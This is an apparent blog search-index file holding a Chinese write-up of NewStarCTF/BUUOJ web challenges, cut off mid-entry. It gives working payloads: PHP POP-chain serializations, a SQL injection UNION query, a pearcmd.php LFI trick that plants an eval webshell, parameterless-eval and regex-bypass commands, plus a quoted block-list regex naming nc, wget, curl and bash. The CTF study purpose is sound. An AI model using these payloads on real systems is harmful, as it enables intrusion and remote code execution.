<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buu刷题</title>
      <link href="/2025/07/10/buu%E5%88%B7%E9%A2%98/"/>
      <url>/2025/07/10/buu%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="NewStarCTF-公开赛赛道-UnserializeOne"><a href="#NewStarCTF-公开赛赛道-UnserializeOne" class="headerlink" title="[NewStarCTF 公开赛赛道]UnserializeOne"></a>[NewStarCTF 公开赛赛道]UnserializeOne</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">\<span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">php反序列化题目</span><br><span class="line"></span><br><span class="line">pop链构造destruct----》call---&gt;<span class="keyword">clone</span>----&gt;tostring---&gt;invoke</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$res</span> = <span class="keyword">new</span> <span class="title class_">Start</span>;</span><br><span class="line"><span class="variable">$res</span>-&gt;name = <span class="keyword">new</span> <span class="title class_">Sec</span>;<span class="comment">//第一条链</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;obj = <span class="keyword">new</span> <span class="title class_">Easy</span>;<span class="comment">//第二条链</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>=<span class="keyword">new</span> eeee;<span class="comment">//第三条链</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj=<span class="keyword">new</span> <span class="title class_">Start</span>;<span class="comment">//第四条链</span></span><br><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj-&gt;func=<span class="keyword">new</span> <span class="title class_">Sec</span>;<span class="comment">//第五条链</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-公开赛道-R-C-E"><a href="#NewStarCTF-2023-公开赛道-R-C-E" class="headerlink" title="[NewStarCTF 2023 公开赛道]R!C!E!"></a>[NewStarCTF 2023 公开赛道]R!C!E!</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123;</span><br><span class="line">  $password=md5($_POST[&#x27;password&#x27;]);</span><br><span class="line">  $code=$_POST[&#x27;e_v.a.l&#x27;];</span><br><span class="line">  if(substr($password,0,6)===&quot;c4d038&quot;)&#123;</span><br><span class="line">    if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123;</span><br><span class="line">      eval($code);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>对参数password进行md5处理，检测其前6位是否是所需要的值，之后对输入的命令进行了过滤</p><p>还有”-“被解析为” .”iscc碰见过</p><p>使用[即可(post传参特性)</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704101644293.png" class="" title="image-20250704101644293"><p>password&#x3D;USriMT35mYgUlenwusWV&amp;e[v.a.l&#x3D;echo(<code>more /fl\ag</code>);</p><p>exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5 = hashlib.md5(rnds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span> (rnds)</span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = <span class="string">&quot;c4d038&quot;</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, <span class="number">0</span>))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-公开赛道-EasyLogin"><a href="#NewStarCTF-2023-公开赛道-EasyLogin" class="headerlink" title="[NewStarCTF 2023 公开赛道]EasyLogin"></a>[NewStarCTF 2023 公开赛道]EasyLogin</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104214430.png" class="" title="image-20250704104214430"><p>是个登录系统抓包爆破，密码使用md5进行加密</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104249692.png" class="" title="image-20250704104249692"><p>账户admin密码000000</p><p>登录抓包</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704104321400.png" class="" title="image-20250704104321400">登录进入界面得到flag<h1 id="NewStarCTF-2023-公开赛道-Begin-of-HTTP"><a href="#NewStarCTF-2023-公开赛道-Begin-of-HTTP" class="headerlink" title="[NewStarCTF 2023 公开赛道]Begin of HTTP"></a>[NewStarCTF 2023 公开赛道]Begin of HTTP</h1><p>根据提示抓包一步一步进行即可</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704110328804.png" class="" title="image-20250704110328804"><p>最后一步修改本地ip地址发现常规X-Forwarded-For: 127.0.0.1无法成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> 1 Client-IP:127.0.0.1</span><br><span class="line"> 2 Forwarded-For-Ip: 127.0.0.1</span><br><span class="line"> 3 Forwarded-For: 127.0.0.1</span><br><span class="line"> 4 Forwarded-For: localhost</span><br><span class="line"> 5 Forwarded:127.0.0.1</span><br><span class="line"> 6 Forwarded: localhost</span><br><span class="line"> 7 True-Client-IP:127.0.0.1</span><br><span class="line"> 8 X-Client-IP: 127.0.0.1</span><br><span class="line"> 9 X-Custom-IP-Authorization : 127.0.0.1</span><br><span class="line">10 X-Forward-For: 127.0.0.1</span><br><span class="line">11 X-Forward: 127.0.0.1</span><br><span class="line">12 X-Forward: localhost</span><br><span class="line">13 X-Forwarded-By:127.0.0.1</span><br><span class="line">14 X-Forwarded-By: localhost</span><br><span class="line">15 X-Forwarded-For-Original: 127.0.0.1</span><br><span class="line">16 X-Forwarded-For-original: localhost</span><br><span class="line">17 X-Forwarded-For: 127.0.0.1</span><br><span class="line">18 X-Forwarded-For: localhost</span><br><span class="line">19 X-Forwarded-Server: 127.0.0.1</span><br><span class="line">20 X-Forwarded-Server: localhost</span><br><span class="line">21 X-Forwarded: 127.0.0.1</span><br><span class="line">22 X-Forwarded: localhost</span><br><span class="line">23 X-Forwared-Host: 127.0.0.1</span><br><span class="line">24 X-Forwared-Host: localhost</span><br><span class="line">25 X-Host: 127.0.0.1</span><br><span class="line">26 X-Host: localhost</span><br><span class="line">27 X-HTTP-Host-Override : 127.0.0.1</span><br><span class="line">28 X-Originating-IP: 127.0.0.1</span><br><span class="line">29 X-Real-IP: 127.0.0.1</span><br><span class="line">30 X-Remote-Addr: 127.0.0.1</span><br><span class="line">31 X-Remote-Addr : localhost</span><br><span class="line">32 X-Remote-IP: 127.0.0.1</span><br></pre></td></tr></table></figure><p>一个一个实验发现 X-Real-IP: 127.0.0.1可以</p><h1 id="NewStarCTF-2023-公开赛道-Begin-of-Upload"><a href="#NewStarCTF-2023-公开赛道-Begin-of-Upload" class="headerlink" title="[NewStarCTF 2023 公开赛道]Begin of Upload"></a>[NewStarCTF 2023 公开赛道]Begin of Upload</h1><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>文件上传，先尝试几个文件上传图片后抓包更改后缀发现直接能传入</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704111246140.png" class="" title="image-20250704111246140"><h1 id="NewStarCTF-2023-公开赛道-Begin-of-PHP"><a href="#NewStarCTF-2023-公开赛道-Begin-of-PHP" class="headerlink" title="[NewStarCTF 2023 公开赛道]Begin of PHP"></a>[NewStarCTF 2023 公开赛道]Begin of PHP</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704113457445.png" class="" title="image-20250704113457445"><p>全部使用数组绕过即可</p><p>key1[]&#x3D;1<br>&amp;key2[]&#x3D;2<br>&amp;key4[]&#x3D;1<br>&amp;key5[]&#x3D;2024</p><p>key3[]&#x3D;1&amp;flag5[]&#x3D;.</p><h1 id="NewStarCTF-2023-公开赛道-泄漏的秘密"><a href="#NewStarCTF-2023-公开赛道-泄漏的秘密" class="headerlink" title="[NewStarCTF 2023 公开赛道]泄漏的秘密"></a>[NewStarCTF 2023 公开赛道]泄漏的秘密</h1><p>robots.txt存在一半flag，扫出网站备份<a href="http://www.zip得到另一半/">www.zip得到另一半</a></p><h1 id="NewStarCTF-2023-公开赛道-ez-sql"><a href="#NewStarCTF-2023-公开赛道-ez-sql" class="headerlink" title="[NewStarCTF 2023 公开赛道]ez_sql"></a>[NewStarCTF 2023 公开赛道]ez_sql</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704143339398.png" class="" title="image-20250704143339398"><p>测试存在waf对and or等关键字都进行了过滤 使用大小写绕过即可</p><p>?id&#x3D;-1’ UniOn seLect database(),2,3,4,GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D; ‘ctf’–+</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704144113407.png" class="" title="image-20250704144113407"><p><a href="http://ff3d18d2-74a4-405a-a674-099ca58fd1b1.node5.buuoj.cn:81/?id=-1">http://ff3d18d2-74a4-405a-a674-099ca58fd1b1.node5.buuoj.cn:81/?id=-1</a>‘ UniOn seLect database(),2,3,4,flag FROM here_is_flag –+</p><p>flag{f1cb957b-fa7d-4e98-b769-4b9c9f60f0e9}</p><h1 id="NewStarCTF-2023-公开赛道-Upload-again"><a href="#NewStarCTF-2023-公开赛道-Upload-again" class="headerlink" title="[NewStarCTF 2023 公开赛道]Upload again!"></a>[NewStarCTF 2023 公开赛道]Upload again!</h1><p>对文件后缀和文件内容存在一定情况的过滤</p><p>配合.htaccess文件上传以下木马即可</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704145512842.png" class="" title="image-20250704145512842"><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704145620831.png" class="" title="image-20250704145620831"><h1 id="NewStarCTF-2023-公开赛道-游戏高手"><a href="#NewStarCTF-2023-公开赛道-游戏高手" class="headerlink" title="[NewStarCTF 2023 公开赛道]游戏高手"></a>[NewStarCTF 2023 公开赛道]游戏高手</h1><p>查看源代码发现需要gameScore的值大于一定的数才给flag</p><p>控制台修改成功</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704151345043.png" class="" title="image-20250704151345043"><h1 id="NewStarCTF-2023-公开赛道-Include-🍐"><a href="#NewStarCTF-2023-公开赛道-Include-🍐" class="headerlink" title="[NewStarCTF 2023 公开赛道]Include 🍐"></a>[NewStarCTF 2023 公开赛道]Include 🍐</h1><p>根据提示读取phpinfo.php文件搜索flag</p><p>给出提示查看register_argc_argv</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704152432301.png" class="" title="image-20250704152432301"><p>发现上网查询资料发现register_argc_argv可以进行rce</p><p>通过调用pearcmd.php进行rce</p><p>register_argc_argv的两个特点</p><p>1.&amp;符无发分割参数，真正能分割参数的是加号</p><p>2.等号无法赋值，而是会直接被传进去当作参数</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" class="" title="image-20211101074033767.png"><p>?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;<?=@eval($_POST['cmd']);?>+&#x2F;tmp&#x2F;test.php</p><p>模拟pear指令创建一个test.php的木马文件</p><p>参考文章<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">Docker PHP裸文件本地包含综述 - 跳跳糖</a></p><h1 id="NewStarCTF-2023-公开赛道-R-C-E-1"><a href="#NewStarCTF-2023-公开赛道-R-C-E-1" class="headerlink" title="[NewStarCTF 2023 公开赛道]R!!C!!E!!"></a>[NewStarCTF 2023 公开赛道]R!!C!!E!!</h1><p>git文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rcebo0g1pop.php </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;</span><br><span class="line">  if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123;</span><br><span class="line">    eval($_GET[&#x27;star&#x27;]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无参数rce</p><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704201307267.png" class="" title="image-20250704201307267"><p>对请求头进行修改即可</p><p>eval(pos(array_reverse(getallheaders()))); </p><h1 id="NewStarCTF-2023-公开赛道-Unserialize？"><a href="#NewStarCTF-2023-公开赛道-Unserialize？" class="headerlink" title="[NewStarCTF 2023 公开赛道]Unserialize？"></a>[NewStarCTF 2023 公开赛道]Unserialize？</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// Maybe you need learn some knowledge about deserialize?</span><br><span class="line">class evil &#123;</span><br><span class="line">  private $cmd;</span><br><span class="line"></span><br><span class="line">  public function __destruct()</span><br><span class="line">  &#123;</span><br><span class="line">    if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123;</span><br><span class="line">      @system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unserialize($_POST[&#x27;unser&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">直接序列化evil即可</span><br><span class="line"></span><br><span class="line">注意private属性需要在前后加入%00</span><br><span class="line"></span><br><span class="line">unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;ca\t /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</span><br><span class="line"></span><br><span class="line">使用\绕过正则即可</span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-公开赛道-R-C-E-2"><a href="#NewStarCTF-2023-公开赛道-R-C-E-2" class="headerlink" title="[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!"></a>[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705095556099.png" class="" title="image-20250705095556099"><p>反序列化加rce</p><p>实例化对象触发 __destruct之后再触发    tostring </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new minipop;</span><br><span class="line">$b = new minipop;</span><br><span class="line">$b -&gt; qwejaskdjnlka=$a;</span><br></pre></td></tr></table></figure><p>通过单引号绕过用tee将指令执行结果输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag_is_h3eeere | t&#x27;&#x27;ee 1</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee 1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$b</span> -&gt; qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><h1 id="NewStarCTF-2023-公开赛道-POP-Gadget"><a href="#NewStarCTF-2023-公开赛道-POP-Gadget" class="headerlink" title="[NewStarCTF 2023 公开赛道]POP Gadget"></a>[NewStarCTF 2023 公开赛道]POP Gadget</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 